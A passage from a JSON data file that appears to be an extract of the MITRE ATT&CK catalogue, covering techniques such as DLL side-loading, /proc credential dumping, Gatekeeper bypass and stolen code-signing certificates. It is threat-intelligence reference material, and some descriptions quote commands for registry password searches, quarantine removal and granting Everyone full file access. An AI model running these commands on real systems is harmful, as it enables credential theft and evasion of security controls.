      "can use DLL side-loading to gain execution.",
      "has used a malicious loader DLL file to execute the `credwiz.exe` process and side-load the malicious payload `Duser.dll`.",
      "can side-load `Goopdate.dll` into `GoogleUpdate.exe`.",
      "can support an HKCMD sideloading start method.",
      "includes one infection vector that leverages a malicious KeyScramblerE.DLL library that will load during the execution of the legitimate KeyScrambler application.",
      "involved the use of DLL search order hijacking to execute .  used also DLL side-loading to execute  via an AhnLab uninstaller.",
      "has used legitimate software to side-load  loaders onto victim systems.  is also linked to multiple other instances of side-loading for initial loading activity.",
      "can load DLLs through vulnerable legitimate executables.",
      "has the ability to side-load malicious DLLs with legitimate applications from Kaspersky Microsoft and Google.",
      "can abuse the legitimate application policytool.exe to load a malicious DLL.",
      "has been distributed and executed as a DLL file named Vspmsg.dll via DLL side-loading.",
      "has used DLL side-loading to load malicious DLL's into legitimate executables.",
      "has replaced `win_fw.dll` an internal component that is executed during IDA Pro installation with a malicious DLL to download and execute a payload.  utilized DLL side-loading to execute malicious payloads through abuse of the legitimate processes `wsmprovhost.exe` and `dfrgui.exe`.",
      "During  the threat actors used the legitimate Windows services `IKEEXT` and `PrintNotify` to side-load malicious DLLs.",
      "exploits a security vulnerability to load a fake DLL and execute its code.",
      "has performed DLL search order hijacking to execute their payload.  has also used DLL side-loading including by using legitimate Kaspersky antivirus variants as well as `rc.exe` a legitimate Microsoft Resource Compiler.",
      "can use side-loading to run malicious executables.",
      "can store a file named `mpsvc.dll` which opens a malicious `mpsvc.mui` file in the same folder as the legitimate Microsoft executable `MsMpEng.exe` to gain execution.",
      "can be installed via DLL side-loading.",
      "has used search order hijacking to load a malicious payload DLL as a dependency to a benign application packaged in the same ISO.  has loaded a malicious DLL by spoofing the name of the legitimate Version.DLL and placing it in the same folder as the digitally-signed Microsoft binary OneDriveUpdater.exe.",
      "launched an HTTP malware variant and a Port 22 malware variant using a legitimate executable that loaded the malicious DLL.",
      "side loads its communications module as a DLL into the libcurl.dll loader.",
      "has used DLL side-loading to drop and execute malicious payloads including the hijacking of the legitimate Windows application file rekeywiz.exe.",
      "has used search order hijacking to execute malicious payloads such as .  has also used legitimate executables to perform DLL side-loading of their malware.",
      "has used DLL side-loading to launch versions of Mimikatz and PwDump6 as well as .  has also used DLL search order hijacking."
    ],
    "description": "Adversaries may abuse dynamic-link library files (DLLs) in order to achieve persistence, escalate privileges, and evade defenses. DLLs are libraries that contain code and data that can be simultaneously utilized by multiple programs. While DLLs are not malicious by nature, they can be abused through mechanisms such as side-loading, hijacking search order, and phantom DLL hijacking.(Citation: unit 42)Specific ways DLLs are abused by adversaries include:### DLL SideloadingAdversaries may execute their own malicious payloads by side-loading DLLs. Side-loading involves hijacking which DLL a program loads by planting and then invoking a legitimate application that executes their payload(s).Side-loading positions both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.Adversaries may also side-load other packages, such as BPLs (Borland Package Library).(Citation: kroll bpl)### DLL Search Order HijackingAdversaries may execute their own malicious payloads by hijacking the search order that Windows uses to load DLLs. This search order is a sequence of special and standard search locations that a program checks when loading a DLL. An adversary can plant a trojan DLL in a directory that will be prioritized by the DLL search order over the location of a legitimate library. This will cause Windows to load the malicious DLL when it is called for by the victim program.(Citation: unit 42)### DLL RedirectionAdversaries may directly modify the search order via DLL redirection, which after being enabled (in the Registry or via the creation of a redirection file) may cause a program to load a DLL from a different location.(Citation: Microsoft redirection)(Citation: Microsoft - manifests/assembly)### Phantom DLL HijackingAdversaries may leverage phantom DLL hijacking by targeting references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.(Citation: Hexacorn DLL Hijacking)(Citation: Hijack DLLs CrowdStrike)### DLL SubstitutionAdversaries may target existing, valid DLL files and substitute them with their own malicious DLLs, planting them with the same name and in the same location as the valid DLL file.(Citation: Wietze Beukema DLL Hijacking)Programs that fall victim to DLL hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace, evading defenses.Remote DLL hijacking can occur when a program sets its current directory to a remote location, such as a Web share, before loading a DLL.(Citation: dll pre load owasp)(Citation: microsoft remote preloading)If a valid DLL is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation.",
    "similar_words": [
      "DLL Search Order Hijacking",
      "DLL"
    ],
    "id": "T1574.001"
  },
  "attack-pattern--3120b9fa-23b8-4500-ae73-09494f607b7d": {
    "name": "Proc Filesystem",
    "example_uses": [
      "has the ability to extract credentials from OS memory.",
      "can use the `<PID>/maps` and `<PID>/mem` files to identify regex patterns to dump cleartext passwords from the browser's process memory.",
      "can use the `<PID>/maps` and `<PID>/mem` file to search for regex patterns and dump the process memory."
    ],
    "description": "Adversaries may gather credentials from the proc filesystem or `/proc`. The proc filesystem is a pseudo-filesystem used as an interface to kernel data structures for Linux based systems managing virtual memory. For each process, the `/proc/<PID>/maps` file shows how memory is mapped within the processs virtual address space. And `/proc/<PID>/mem`, exposed for debugging purposes, provides access to the processs virtual address space.(Citation: Picus Labs Proc cump 2022)(Citation: baeldung Linux proc map 2022)When executing with root privileges, adversaries can search these memory locations for all processes on a system that contain patterns indicative of credentials. Adversaries may use regex patterns, such as grep -E \"^[0-9a-f-]* r\" /proc/\"$pid\"/maps | cut -d' ' -f 1, to look for fixed strings in memory structures or cached hashes.(Citation: atomic-red proc file system) When running without privileged access, processes can still view their own virtual memory locations. Some services or programs may save credentials in clear text inside the processs memory.(Citation: MimiPenguin GitHub May 2017)(Citation: Polop Linux PrivEsc Gitbook)If running as or with the permissions of a web browser, a process can search the `/maps` & `/mem` locations for common website credential patterns (that can also be used to find adjacent memory within the same structure) in which hashes or cleartext credentials may be located.",
    "similar_words": [
      "Proc Filesystem"
    ],
    "id": "T1003.007"
  },
  "attack-pattern--31225cd3-cd46-4575-b287-c2c14011c074": {
    "name": "Botnet",
    "example_uses": [
      "has incorporated leased devices into covert networks to obfuscate communications.",
      "has acquired a network of compromised systems  specifically an ORB (operational relay box) network  for follow on activities.",
      "has utilized an ORB (operational relay box) network for reconnaissance and vulnerability exploitation."
    ],
    "description": "Adversaries may buy, lease, or rent a network of compromised systemsthat can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.(Citation: Norton Botnet) Adversaries may purchase a subscription to use an existing botnet from a booter/stresser service. Internet-facing edge devices and related network appliances that are end-of-life (EOL) and unsupported by their manufacturers are commonly acquired for botnet activities. Adversaries may lease operational relay box (ORB) networks  consisting of virtual private servers (VPS), small office/home office (SOHO) routers, or Internet of Things (IoT) devices  to serve as a botnet.(Citation: ORB Mandiant) With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566) or Distributed Denial of Service (DDoS).(Citation: Imperva DDoS for Hire)(Citation: Krebs-Anna)(Citation: Krebs-Bazaar)(Citation: Krebs-Booter) Acquired botnets may also be used to support Command and Control activity, such as [Hide Infrastructure](https://attack.mitre.org/techniques/T1665) through an established [Proxy](https://attack.mitre.org/techniques/T1090) network.",
    "similar_words": [
      "Botnet"
    ],
    "id": "T1583.005"
  },
  "attack-pattern--315f51f0-6b03-4c1e-bfb2-84740afb8e21": {
    "name": "Password Managers",
    "example_uses": [
      "During  threat actors accessed and collected credentials from password managers.",
      "obtained a KeePass database from a compromised host.",
      "has used scripts to access credential information from the KeePass database.",
      "can gather information from the Keepass password manager.",
      "gathers credentials in files for 1password.",
      "can steal passwords from the KeePass open source password manager.",
      "has accessed local password managers and databases to obtain further credentials from a compromised network.",
      "has accessed and exported passwords from password managers."
    ],
    "description": "Adversaries may acquire user credentials from third-party password managers.(Citation: ise Password Manager February 2019) Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk.(Citation: ise Password Manager February 2019)Adversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory.(Citation: FoxIT Wocao December 2019)(Citation: Github KeeThief) Adversaries may extract credentials from memory via [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212).(Citation: NVD CVE-2019-3610) Adversaries may also try brute forcing via [Password Guessing](https://attack.mitre.org/techniques/T1110/001) to obtain the master password of a password manager.(Citation: Cyberreason Anchor December 2019)",
    "similar_words": [
      "Password Managers"
    ],
    "id": "T1555.005"
  },
  "attack-pattern--31a0a2ac-c67c-4a7e-b9ed-6a96477d4e8e": {
    "name": "Gatekeeper Bypass",
    "example_uses": [
      "has dropped a malicious applet into an app's `.../Contents/MacOS/` folder of a previously launched app to bypass Gatekeeper's security checks on first launch apps (prior to macOS 13).",
      "If running with elevated privileges  has used the spctl command to disable Gatekeeper protection for a downloaded file.  can also leverage system links pointing to bash scripts in the downloaded DMG file to bypass Gatekeeper a flaw patched in macOS 11.3 and later versions.  has been Notarized by Apple resulting in successful passing of additional Gatekeeper checks.",
      "has removed the `com.apple.quarantineattribute` from the dropped file `$TMPDIR/airportpaird`.",
      "uses the command xattr -d com.apple.quarantine to remove the quarantine file attribute used by Gatekeeper.",
      "downloads the EggShell mach-o binary using curl which does not set the quarantine flag.",
      "can use `xattr -d com.apple.quarantine` to remove the quarantine flag attribute."
    ],
    "description": "Adversaries may modify file attributes and subvert Gatekeeper functionality to evade user prompts and execute untrusted programs. Gatekeeper is a set of technologies that act as layer of Apples security model to ensure only trusted applications are executed on a host. Gatekeeper was built on top of File Quarantine in Snow Leopard (10.6, 2009) and has grown to include Code Signing, security policy compliance, Notarization, and more. Gatekeeper also treats applications running for the first time differently than reopened applications.(Citation: TheEclecticLightCompany Quarantine and the flag)(Citation: TheEclecticLightCompany apple notarization )Based on an opt-in system, when files are downloaded an extended attribute (xattr) called `com.apple.quarantine` (also known as a quarantine flag) can be set on the file by the application performing the download. Launch Services opens the application in a suspended state. For first run applications with the quarantine flag set, Gatekeeper executes the following functions:1. Checks extended attribute  Gatekeeper checks for the quarantine flag, then provides an alert prompt to the user to allow or deny execution.(Citation: OceanLotus for OS X)(Citation: 20 macOS Common Tools and Techniques)2. Checks System Policies - Gatekeeper checks the system security policy, allowing execution of apps downloaded from either just the App Store or the App Store and identified developers.3. Code Signing  Gatekeeper checks for a valid code signature from an Apple Developer ID.4. Notarization - Using the `api.apple-cloudkit.com` API, Gatekeeper reaches out to Apple servers to verify or pull down the notarization ticket and ensure the ticket is not revoked. Users can override notarization, which will result in a prompt of executing an unauthorized app and the security policy will be modified.Adversaries can subvert one or multiple security controls within Gatekeeper checks through logic errors (e.g. [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211)), unchecked file types, and external libraries. For example, prior to macOS 13 Ventura, code signing and notarization checks were only conducted on first launch, allowing adversaries to write malicious executables to previously opened applications in order to bypass Gatekeeper security checks.(Citation: theevilbit gatekeeper bypass 2021)(Citation: Application Bundle Manipulation Brandon Dalton)Applications and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the curl command may not set the quarantine flag. Additionally, it is possible to avoid setting the quarantine flag using [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).",
    "similar_words": [
      "Gatekeeper Bypass"
    ],
    "id": "T1553.001"
  },
  "attack-pattern--31fe0ba2-62fd-4fd9-9293-4043d84f7fe9": {
    "name": "Drive-by Target",
    "example_uses": [
      "has set up websites with malicious hyperlinks and iframes to infect targeted victims with   and other malicious tools.",
      "has redirected compromised machines to an actor-controlled webpage through HTML injection.",
      "has compromised websites to redirect traffic and to host exploit kits.",
      "has stood up websites containing numerous articles and content scraped from the Internet to make them appear legitimate but some of these pages include malicious JavaScript to profile the potential victim or infect them via a fake software update.",
      "has compromised a digital product website and modified multiple download links to point to trojanized versions of offered digital products.",
      "has embedded malicious code into websites to screen a potential victim's IP address and then exploit their browser if they are of interest.",
      "For  the threat actors compromised the login page of a legitimate Israeli shipping company and likely established a watering hole that collected visitor information.",
      "has injected malicious JavaScript into compromised websites to infect victims via drive-by download.",
      "used strategic website compromise to fingerprint then target victims."
    ],
    "description": "Adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing. Endpoint systems may be compromised through browsing to adversary controlled sites, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). In such cases, the user's web browser is typically targeted for exploitation (often not requiring any extra user interaction once landing on the site), but adversaries may also set up websites for non-exploitation behavior such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001). Prior to [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site. Drive-by content can be staged on adversary controlled infrastructure that has been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).Adversaries may upload or inject malicious web content, such as [JavaScript](https://attack.mitre.org/techniques/T1059/007), into websites.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015) This may be done in a number of ways, including:* Inserting malicious scripts into web pages or other user controllable web content such as forum posts* Modifying script files served to websites from publicly writeable cloud storage buckets* Crafting malicious web advertisements and purchasing ad space on a website through legitimate ad providers (i.e., [Malvertising](https://attack.mitre.org/techniques/T1583/008))In addition to staging content to exploit a user's web browser, adversaries may also stage scripting content to profile the user's browser (as in [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592)) to ensure it is vulnerable prior to attempting exploitation.(Citation: ATT ScanBox)Websites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is referred to a strategic web compromise or watering hole attack.Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).",
    "similar_words": [
      "Drive-by Target"
    ],
    "id": "T1608.004"
  },
  "attack-pattern--32901740-b42c-4fdd-bc02-345b5dc57082": {
    "name": "Code Signing",
    "example_uses": [
      "can use self signed Java applets to execute signed applet attacks.",
      "has been signed with self signed digital certificates mimicking a legitimate software company.",
      "has signed  payloads with legally purchased code signing certificates.  has also digitally signed their phishing documents backdoors and other staging tools to bypass security controls.",
      "has used self-signed and stolen certificates originally issued to NVIDIA and Global Software LLC.",
      "Some  samples were signed with a stolen digital certificate.",
      "has signed malware with self-signed certificates from fictitious and spoofed legitimate software companies.",
      "has been signed by valid certificates assigned to Hermetica Digital.",
      "has signed files with the name EGIS CO. Ltd..",
      "samples have been signed with legitimate compromised code signing certificates owned by software company AI Squared.",
      "The  dropper has been digitally signed with a certificate issued by Akeo Consulting for legitimate executables used for creating bootable USB drives.",
      "has used stolen certificates to sign its tools including those from Whizzimo LLC.",
      "leveraged code-signing certificates to sign malware when targeting both gaming and non-gaming organizations.",
      "For  the threat actors used DLL files that had invalid certificates.",
      "has used forged Microsoft code-signing certificates on malware.",
      "has been signed with stolen digital certificates.",
      "The  executable has been signed with a legitimate certificate issued to Hermetica Digital Ltd.",
      "digitally signs the malware with a code-signing certificate.",
      "has been signed with code-signing certificates such as CodeRipper.",
      "drops a signed Microsoft DLL to disk.",
      "has used a valid digital signature from Sectigo to appear legitimate.",
      "During  the threat actors deployed the MaoCheng dropper with a stolen Adobe Systems digital signature.",
      "has come signed with revoked certificates.",
      "During   digitally signed their own malware to evade detection.",
      "can use signed loaders to evade detection.",
      "has used stolen certificates from Electrum Technologies GmbH to sign payloads.",
      "samples have been signed with a code-signing certificates.",
      "has been signed with valid certificates to evade detection by security tools.",
      "has digitally signed malware and utilities to evade detection.",
      "During the   was able to get  signed by SolarWinds code signing certificates by injecting the malware into the SolarWinds Orion software lifecycle.",
      "has used valid digital certificates from Sysprint AG to sign its  dropper.",
      "has used signed drivers from an open source tool called DiskCryptor to evade detection.",
      "has used a valid certificate to sign their primary loader Silence.Downloader (aka TrueBot).",
      "was digitally signed by SolarWinds from March - May 2020.",
      "has used Digicert code-signing certificates for some of its malware.",
      "has used stolen code signing certificates to sign malware.",
      "has used Comodo code-signing certificates.",
      "can use code signing to evade detection.",
      "has resized and added data to the certificate table to enable the signing of modified files with legitimate signatures.",
      "has been signed by a valid CA.",
      "has signed code with self-signed certificates.",
      "has used code-signing certificates on its malware that are either forged due to weak keys or stolen.  has also stolen certificates and signed backdoors and downloaders with them.",
      "has been signed with fake certificates including those appearing to be from VB CORPORATE PTY. LTD.",
      "has signed payloads with code signing certificates from Thawte and Sectigo.",
      "has digitally signed executables using AVAST Software certificates.",
      "has been signed with stolen certificates in order to make it look more legitimate.",
      "versions are signed with various valid certificates; one was likely faked and issued by Comodo for Solid Loop Ltd and another was issued for Ultimate Computer Support Ltd.",
      "has used a valid legitimate digital signature to evade detection.",
      "has come with a signed downloader component.",
      "has used a signed binary shellcode loader and a signed Dynamic Link Library (DLL) to create a reverse shell.",
      "has used stolen certificates to sign its malware.",
      "A  .dll file is digitally signed by a certificate from AirVPN.",
      "used a digitally signed driver with a compromised Realtek certificate.",
      "has installed a self-signed RPM package mimicking the original system package on RPM based systems.",
      "has been signed with valid digital certificates.",
      "has been signed with self-signed certificates.",
      "has signed their malware with a valid digital signature.",
      "its installer and tools are signed with stolen code-signing certificates.",
      "used stolen certificates to sign its malware.",
      "digitally signed an executable with a stolen certificate from legitimate company AI Squared.",
      "used a valid AppleDeveloperID to sign the code to get past security restrictions.",
      "samples were digitally signed with a certificate originally used by Hacking Team that was later leaked and subsequently revoked.",
      "was signed with valid Certum certificates.",
      "has been delivered using ad hoc Apple Developer code signing certificates.",
      "has used an initial loader malware featuring a legitimate code signing certificate associated with Electrum Technologies GmbH.",
      "has been digitally signed with a certificate issued to the Kuwait Telecommunications Company KSC.",
      "can deploy a vulnerable signed driver on a compromised host to bypass operating system safeguards.",
      "has used signed but not notarized malicious files for execution in macOS environments.",
      "has been dropped by a self-extracting archive signed with a valid digital certificate.",
      "used stolen code signing certificates for  malware and subsequent payloads.",
      "used legitimate signed binaries such as `inkform.exe` or `ExcelRepairToolboxLauncher.exe` for follow-on execution of malicious DLLs through DLL search order hijacking in .",
      "has signed files with the name EGIS CO. Ltd. and has stolen a valid certificate that is used to sign the malware and the dropper.",
      "variants have used valid code signing certificates.",
      "along with its associated dropper utilizes legitimate stolen code signing certificates.",
      "has signed its malware with stolen certificates.",
      "has used valid code signing digital certificates from ConsolHQ LTD and Verandah Green Limited to appear legitimate.",
      "uses stolen legitimate code signing certificates for defense evasion."
    ],
    "description": "Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) The certificates used during an operation may be created, acquired, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates) Unlike [Invalid Code Signature](https://attack.mitre.org/techniques/T1036/001), this activity will result in a valid signature.Code signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)(Citation: EclecticLightChecksonEXECodeSigning)Code signing certificates may be used to bypass security policies that require signed code to execute on a system. ",
    "similar_words": [
      "Code Signing"
    ],
    "id": "T1553.002"
  },
  "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7": {
    "name": "Data from Cloud Storage",
    "example_uses": [
      "has obtained files from the victim's cloud storage instances.",
      "can dump the contents of AWS S3 buckets. It can also retrieve service account tokens from kOps buckets in Google Cloud Storage or S3.",
      "enumerates data stored in cloud resources for collection and exfiltration purposes.",
      "can enumerate and download files stored in AWS storage services such as S3 buckets.",
      "During   accessed victim OneDrive environments to search for VPN and MFA enrollment information help desk instructions and new hire guides.",
      "AADInternals can collect files from a users OneDrive.",
      "has collected data from Microsoft 365 environments.",
      "has exfitrated data from OneDrive."
    ],
    "description": "Adversaries may access data from cloud storage.Many IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. In some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). Adversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.This open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)Adversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
    "similar_words": [
      "Data from Cloud Storage"
    ],
    "id": "T1530"
  },
  "attack-pattern--32ad5c86-2bcf-47d8-8fdc-d7f3d79a7490": {
    "name": "Runtime Data Manipulation",
    "example_uses": [
      "has used DYEPACK.FOX to manipulate PDF data as it is accessed to remove traces of fraudulent SWIFT transactions from the data displayed to the end user."
    ],
    "description": "Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.Adversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct [Change Default File Association](https://attack.mitre.org/techniques/T1546/001) and [Masquerading](https://attack.mitre.org/techniques/T1036) to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
    "similar_words": [
      "Runtime Data Manipulation"
    ],
    "id": "T1565.003"
  },
  "attack-pattern--341e222a-a6e3-4f6f-b69c-831d792b1580": {
    "name": "Credentials in Registry",
    "example_uses": [
      "may be used to find credentials in the Windows Registry.",
      "has several modules that search the Windows Registry for stored credentials: Get-UnattendedInstallFile Get-Webconfig Get-ApplicationHost Get-SiteListPassword Get-CachedGPPPassword and Get-RegistryAutoLogon.",
      "used Outlook Credential Dumper to harvest credentials stored in Windows registry.",
      "can harvest credentials from local and remote host registries.",
      "has retrieved PuTTY credentials by querying the Software\\SimonTatham\\Putty\\Sessions registry key",
      "can use the clientgrabber module to steal e-mail credentials from the Registry.",
      "has the ability to extract credentials from the Registry.",
      "used  to obtain passwords in the Registry.",
      "enumerates the registry key `HKCU\\SOFTWARE\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\` to identify the values for IMAP User IMAP Server and IMAP Password associated with the Outlook email application."
    ],
    "description": "Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.Example commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credentials)* Local Machine Hive: reg query HKLM /f password /t REG_SZ /s* Current User Hive: reg query HKCU /f password /t REG_SZ /s",
    "similar_words": [
      "Credentials in Registry"
    ],
    "id": "T1552.002"
  },
  "attack-pattern--34a80bc4-80f2-46e6-94ff-f3265a4b657c": {
    "name": "Break Process Trees",
    "example_uses": [
      "After initial execution  forks itself and runs the fork with the `--init` flag which allows it to execute secondary clean up operations. The parent process terminates leaving the forked process to be inherited by the legitimate process init."
    ],
    "description": "An adversary may attempt to evade process tree-based analysis by modifying executed malware's parent process ID (PPID). If endpoint protection software leverages the parent-child\" relationship for detection, breaking this relationship could result in the adversarys behavior not being associated with previous process tree activity. On Unix-based systems breaking this process tree is common practice for administrators to execute software using scripts and programs.(Citation: 3OHA double-fork 2022) On Linux systems, adversaries may execute a series of [Native API](https://attack.mitre.org/techniques/T1106) calls to alter malware's process tree. For example, adversaries can execute their payload without any arguments, call the `fork()` API call twice, then have the parent process exit. This creates a grandchild process with no parent process that is immediately adopted by the `init` system process (PID 1), which successfully disconnects the execution of the adversary's payload from its previous process tree.Another example is using the daemon syscall to detach from the current parent process and run in the background.(Citation: Sandfly BPFDoor 2022)(Citation: Microsoft XorDdos Linux Stealth 2022) ",
    "similar_words": [
      "Break Process Trees"
    ],
    "id": "T1036.009"
  },
  "attack-pattern--34ab90a3-05f6-4259-8f21-621081fdaba5": {
    "name": "Network Topology",
    "example_uses": [
      "has searched for infrastructure that can provide remote access to an environment for targeting efforts.",
      "has conducted extensive reconnaissance of victim networks including identifying network topologies.",
      "has used configuration files from exploited network devices to help discover upstream and downstream network segments."
    ],
    "description": "Adversaries may gather information about the victim's network topology that can be used during targeting. Information about network topologies may include a variety of details, including the physical and/or logical arrangement of both external-facing and internal network environments. This information may also include specifics regarding network devices (gateways, routers, etc.) and other infrastructure.Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about network topologies may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: DNS Dumpster) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
    "similar_words": [
      "Network Topology"
    ],
    "id": "T1590.004"
  },
  "attack-pattern--34b3f738-bd64-40e5-a112-29b0542bc8bf": {
    "name": "Code Signing Certificates",
    "example_uses": [
      "has created self-signed certificates to sign malicious installers.",
      "has created self-signed certificates from fictitious and spoofed legitimate software companies that were later used to sign malware.",
      "During   digitally signed their malware and the dbxcli utility.",
      "created code signing certificates to sign malicious macOS files."
    ],
    "description": "Adversaries may create self-signed code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.Prior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may develop self-signed code signing certificates for use in operations.",
    "similar_words": [
      "Code Signing Certificates"
    ],
    "id": "T1587.002"
  },
  "attack-pattern--34e793de-0274-4982-9c1a-246ed1c19dee": {
    "name": "Windows File and Directory Permissions Modification",
    "example_uses": [
      "can use the command-line utility cacls.exe to change file permissions.",
      "can use icacls /reset and takeown /F to reset a targeted executable's permissions and then take ownership.",
      "can modify the binary ACL to prevent security tools from running.",
      "has used the icacls command to modify access control to backup servers providing them with full control of all the system folders.",
      "can modify ACL entries to take ownership of files.",
      "can launch icacls <path> /grant Everyone:F /T /C /Q to delete every access-based restrictions on files and directories.",
      "can use Windows commands such as `fsutil behavior set SymLinkEvaluation R2L:1` to redirect file system access to a different location after gaining access into compromised networks.",
      "uses attrib +h and icacls . /grant Everyone:F /T /C /Q to make some of its files hidden and grant all users full access controls.",
      "has a command to take ownership of a file and reset the ACL permissions using the takeown.exe /F filepath command.",
      "uses the `mountvol.exe` command to mount volume names and leverages the Microsoft Discretionary Access Control List tool `icacls.exe` to grant the group to Everyone full access to the root of the drive.",
      "has used `cacls.exe` via batch script to modify file and directory permissions in victim environments."
    ],
    "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).Windows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.(Citation: Microsoft Access Control Lists May 2018)Adversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, [PowerShell](https://attack.mitre.org/techniques/T1059/001) provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).",
    "similar_words": [
      "Windows File and Directory Permissions Modification"
    ],
    "id": "T1222.001"
  },
